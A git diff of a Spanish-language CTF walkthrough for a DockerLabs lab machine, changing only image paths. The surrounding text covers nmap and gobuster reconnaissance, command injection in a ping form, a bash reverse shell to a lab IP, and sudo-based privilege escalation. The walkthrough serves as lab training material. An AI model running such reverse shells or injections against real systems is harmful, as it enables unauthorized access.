@@ -4,7 +4,7 @@ image: /assets/img/Anexos/Pasted%20image%2020250329195808-1.png
 categories: [CTF]
 tags: [dockerlabs,hacking]
 ---
-![](Pasted%20image%2020250329195808-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329195808-1.png)
 
 ## Reconocimiento
 Comenzamos con un escaneo completo de `nmap` para sacar los puertos y versiones:
@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.46 seconds
 Nmap nos reporta los puertos _80_, _443_ y _5000_:
 
 Por el puerto _443(https)_ tenemos esta web que tiene el .html por defecto de apache por lo que voy a ejecutar `gobuster` para listar:
-![](Pasted%20image%2020250329200216-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329200216-1.png)
 
 
 ```
@@ -66,23 +66,23 @@ Starting gobuster in directory enumeration mode
 /machine.php          (Status: 200) [Size: 6989]
 ```
 Rápidamente `gobuster` me reporta esta web donde poco podemos hacer.
-![](Pasted%20image%2020250329200325-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329200325-1.png)
 
 En cambio, por el puerto _5000_ tenemos esta web que parece que hace un `ping`:
-![|896](Pasted%20image%2020250329200410-1.png)
+![|896](/assets/img/Anexos/Pasted%20image%2020250329200410-1.png)
 
 
-![](Pasted%20image%2020250329200447-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329200447-1.png)
 
 ## Explotación
 Pruebo **Command Injection** y es vulnerable:
-![](Pasted%20image%2020250329200525-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329200525-1.png)
 Entonces me lanzo una reverse shell:
 ```shell
 bash -c "bash -i >& /dev/tcp/192.168.1.89/4444 0>&1"
 ```
 
-![|894](Pasted%20image%2020250329200626-1.png)
+![|894](/assets/img/Anexos/Pasted%20image%2020250329200626-1.png)
 
 ## Escalada 
 Una vez dentro como el usuario **freddy** tenemos los siguientes usuarios en la máquina:
@@ -112,10 +112,10 @@ Para escalar ejecuto:
 freddy@2d7edf097ede:/opt$ sudo -u bobby dpkg -l
 ```
 Y luego pongo:
-![](Pasted%20image%2020250329201413-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329201413-1.png)
 Como **bobby** me vi obligado a mudar de shell ya que estaba teniendo muchos problemas para la próxima escalada:
 
-![|923](Pasted%20image%2020250329221321-1-1-1.png)
+![|923](/assets/img/Anexos/Pasted%20image%2020250329221321-1-1-1.png)
 
 Como **bobby** podemos ejecutar `php` como **gladys**
 ```shell
